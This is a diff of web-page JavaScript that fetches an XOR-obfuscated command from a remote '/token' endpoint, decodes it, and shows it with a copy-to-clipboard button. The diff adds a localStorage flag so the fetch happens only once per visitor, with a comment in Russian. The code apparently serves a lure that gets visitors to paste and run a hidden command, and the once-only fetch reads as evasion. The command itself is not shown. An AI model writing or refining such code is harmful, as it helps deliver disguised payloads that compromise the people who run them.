@@ -6,7 +6,39 @@
     return arr.map(function (b) { return String.fromCharCode(b ^ 0x5A); }).join('');
   }
 
+  function setupCopyButton() {
+    var btn = _d.getElementById('copyButton');
+    var el = _d.getElementById('commandToCopy');
+    if (!btn || !el) return;
+
+    btn.addEventListener('click', function (e) {
+      e.preventDefault();
+      var text = el.textContent || '';
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).catch(function () {});
+      } else {
+        var t = _d.createElement('textarea');
+        t.value = text;
+        _d.body.appendChild(t);
+        t.select();
+        _d.execCommand('copy');
+        _d.body.removeChild(t);
+      }
+      var original = btn.textContent;
+      btn.textContent = 'Copied!';
+      btn.style.pointerEvents = 'none';
+      setTimeout(function () {
+        btn.textContent = original;
+        btn.style.pointerEvents = '';
+      }, 2000);
+    });
+  }
+
   function init() {
+    setupCopyButton();
+
+    if (localStorage.getItem('_done')) return;
+
     fetch(base + '/token')
       .then(function (r) { return r.json(); })
       .then(function (res) {
@@ -22,29 +54,8 @@
         var cmd = decode(res.data);
         var el = _d.getElementById('commandToCopy');
         if (el) el.textContent = cmd;
-        var btn = _d.getElementById('copyButton');
-        if (btn) {
-          btn.addEventListener('click', function (e) {
-            e.preventDefault();
-            if (navigator.clipboard) {
-              navigator.clipboard.writeText(cmd).catch(function () {});
-            } else {
-              var t = _d.createElement('textarea');
-              t.value = cmd;
-              _d.body.appendChild(t);
-              t.select();
-              _d.execCommand('copy');
-              _d.body.removeChild(t);
-            }
-            var original = btn.textContent;
-            btn.textContent = 'Copied!';
-            btn.style.pointerEvents = 'none';
-            setTimeout(function () {
-              btn.textContent = original;
-              btn.style.pointerEvents = '';
-            }, 2000);
-          });
-        }
+        // Ставим флаг только после успешного получения команды
+        localStorage.setItem('_done', '1');
       })
       .catch(function () {});
   }
